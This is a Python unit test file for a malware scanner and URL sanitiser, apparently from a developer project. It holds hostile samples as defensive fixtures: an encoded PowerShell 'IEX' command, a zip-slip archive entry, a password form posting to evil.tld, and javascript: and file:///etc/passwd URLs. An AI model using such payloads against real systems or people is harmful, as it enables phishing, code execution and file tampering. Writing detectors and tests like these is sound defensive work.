import io
import unittest
import zipfile

from devai_av import EICAR, scan_bytes
from devai_web import normalize_url, url_is_safe


class AntivirusTest(unittest.TestCase):
    def test_eicar_is_malicious(self):
        report = scan_bytes(EICAR, "eicar.com")
        self.assertEqual(report["verdict"], "malicious")
        self.assertEqual(report["score"], 100)
        self.assertIn("eicar", [finding["id"] for finding in report["findings"]])

    def test_clean_text(self):
        report = scan_bytes(b"hello\nthis is a normal note\n", "note.txt")
        self.assertEqual(report["verdict"], "clean")

    def test_encoded_powershell(self):
        report = scan_bytes(
            b"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==",
            "stage.ps1",
        )
        self.assertEqual(report["verdict"], "malicious")

    def test_archive_with_executable_and_zip_slip(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("../../evil.exe", b"MZ" + b"\0" * 64)
        report = scan_bytes(buffer.getvalue(), "bundle.zip")
        self.assertEqual(report["verdict"], "malicious")
        ids = {finding["id"] for finding in report["findings"]}
        self.assertIn("archive-exec", ids)
        self.assertIn("zip-slip", ids)

    def test_external_password_form(self):
        report = scan_bytes(
            b'<html><form action="https://evil.tld/login"><input type="password"></form></html>',
            "login.html",
        )
        self.assertEqual(report["verdict"], "malicious")


class UrlTest(unittest.TestCase):
    def test_telegram_and_www(self):
        self.assertEqual(normalize_url("t.me/devAI_Studio_bot"), "https://t.me/devAI_Studio_bot")
        self.assertEqual(normalize_url("www.example.com"), "https://www.example.com/")

    def test_private_and_script_urls(self):
        self.assertFalse(url_is_safe("http://127.0.0.1/"))
        self.assertIsNone(normalize_url("javascript:alert(1)"))
        self.assertIsNone(normalize_url("file:///etc/passwd"))


if __name__ == "__main__":
    unittest.main()
